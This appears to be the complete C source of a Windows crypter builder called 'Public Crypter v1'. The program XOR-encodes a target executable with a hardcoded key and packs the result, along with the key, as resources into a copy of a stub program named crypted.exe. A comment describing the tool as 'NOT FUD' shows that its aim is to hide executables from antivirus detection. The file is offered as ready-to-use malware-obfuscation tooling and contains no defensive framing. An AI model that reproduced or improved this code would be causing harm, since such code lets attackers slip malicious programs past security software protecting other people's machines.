#include <stdio.h>
#include <windows.h>

#define IDR_STUB 1

struct StubData{
    unsigned char * pFileBuffer;
    unsigned long FileSize;
    unsigned char * pKey;
    unsigned long KeySize;
};

/* Generic Error & Exit Function */
void error(char * msg)
{
    printf("%s\n", msg);
    exit(EXIT_FAILURE);
}


/* This Function Loads the File into the HEAP memory space */
void LoadFile(char *File, struct StubData * sData)
{
	unsigned long BytesRead;
	HANDLE hFile = CreateFile(File, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	printf("[*]Loading Portable Executable\n");
	if(hFile == INVALID_HANDLE_VALUE)
	{
		error("Error - Cannot open file");
	}

	sData->FileSize = GetFileSize(hFile, NULL);
	if(sData->FileSize == INVALID_FILE_SIZE)
	{
		CloseHandle(hFile);
		error("Error - Cannot retrieve file size");
	}

	sData->pFileBuffer = (unsigned char *)malloc(sData->FileSize);
	if(sData->pFileBuffer == NULL)
	{
		CloseHandle(hFile);
		error("Error - Cannot allocate room");
	}

    ReadFile(hFile, sData->pFileBuffer, sData->FileSize, &BytesRead, NULL);
	CloseHandle(hFile);
}

/* Simple XOR Encryption (NOT FUD -- Learn to Develop your own) */
void Encrypt(struct StubData * sData)
{
    int i,j;
    sData->pKey="mysecretpassword";
    sData->KeySize=strlen(sData->pKey);
    j=0;
    i=0;
    printf("[*]Encoding\n");

    for(i;i<sData->FileSize;i++)
    {
        *(sData->pFileBuffer+i) ^=*(sData->pKey+j);
        j++;

        if (j>=sData->KeySize)j=0;

    }

}

/* Load the stub and resource data (sData) and write out a new file "crypted.exe" */
void Build(struct StubData * sData)
{

    HRSRC hRsrc;
    HGLOBAL hGlob;
    HANDLE hFile, hUpdate;

    unsigned long rSize;
    unsigned char * pBuffer;
    unsigned long BytesWritten;

    printf("[*]Building Crypted.exe\n");

    hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_STUB), "STUB");
    if(hRsrc == NULL)
    {
        error("Error Could not find resource");

    }
    rSize = SizeofResource(NULL, hRsrc);

    hGlob = LoadResource(NULL, hRsrc);
    if(hGlob == NULL)error("Error - Could not load resource");

    pBuffer = (unsigned char *)LockResource(hGlob);
    if(pBuffer == NULL)error("Error - Could not lock resource");

    hFile = CreateFile("crypted.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
    {
        free(pBuffer);
        free(sData->pFileBuffer);
        error("Error - Could not create file");
    }

    if(WriteFile(hFile, pBuffer, rSize, &BytesWritten, NULL)==0)
    {
        free(pBuffer);
        free(sData->pFileBuffer);
        error("Error - Could not write to file");
    }

    CloseHandle(hFile);
    free(pBuffer);

    hUpdate = BeginUpdateResource("crypted.exe", FALSE);
    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(10), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), sData->pFileBuffer, sData->FileSize)==0)
    {
        error("Error - Could not update resource");
    }

    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(20), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), sData->pKey, sData->KeySize)==0)
    {
        error("Error - Could not update resource");
    }
    EndUpdateResource(hUpdate, FALSE);

}

int main(int argc, char * argv[])
{

    struct StubData sData;

    char intro[]=
    "\x20\x20\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x20"
    "\x5f\x5f\x20\x20\x20\x20\x20\x20\x2e\x5f\x5f\x5f"
    "\x2e\x5f\x5f\x20\x20\x20\x20\x20\x20\x20\x20\x20"
    "\x20\x20\x20\x20\x20\x0d\x0a\x20\x2f\x20\x20\x20"
    "\x5f\x5f\x5f\x5f\x5f\x2f\x2f\x20\x20\x7c\x5f\x20"
    "\x20\x5f\x5f\x7c\x20\x5f\x2f\x7c\x5f\x5f\x7c\x20"
    "\x5f\x5f\x5f\x5f\x20\x20\x5f\x5f\x5f\x5f\x5f\x5f"
    "\x0d\x0a\x20\x5f\x5f\x5f\x5f\x5f\x20\x20\x5c\x20"
    "\x20\x20\x5f\x5f\x2f\x20\x5f\x5f\x20\x7c\x20\x7c"
    "\x20\x20\x7c\x2f\x20\x20\x5f\x20\x2f\x20\x20\x5f"
    "\x5f\x5f\x2f\x0d\x0a\x20\x2f\x20\x20\x20\x20\x20"
    "\x20\x20\x20\x7c\x20\x20\x7c\x20\x2f\x20\x2f\x5f"
    "\x2f\x20\x7c\x20\x7c\x20\x20\x28\x20\x20\x3c\x5f"
    "\x3e\x20\x29\x5f\x5f\x5f\x20\x20\x0d\x0a\x2f\x5f"
    "\x5f\x5f\x5f\x5f\x5f\x5f\x20\x20\x2f\x7c\x5f\x5f"
    "\x7c\x20\x5f\x5f\x5f\x5f\x20\x7c\x20\x7c\x5f\x5f"
    "\x7c\x5f\x5f\x5f\x5f\x2f\x5f\x5f\x5f\x5f\x20\x20"
    "\x3e\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x2f"
    "\x20\x50\x75\x62\x6c\x69\x63\x20\x20\x20\x20\x2f"
    "\x20\x43\x72\x79\x74\x70\x65\x72\x20\x76\x31\x20"
    "\x20\x20\x20\x2f\x20\x0d\x0a\x0d\x0a\x0d\x0a";

    printf("%s", intro);

    if (argc < 2)
    {
        error("Usage: cryptit <file.exe>");
    }

    LoadFile(argv[1], &sData);
    Encrypt(&sData);
    Build(&sData);
    free(sData.pFileBuffer);
    printf("[*]Finished Successfully\n");

    return 0;
}
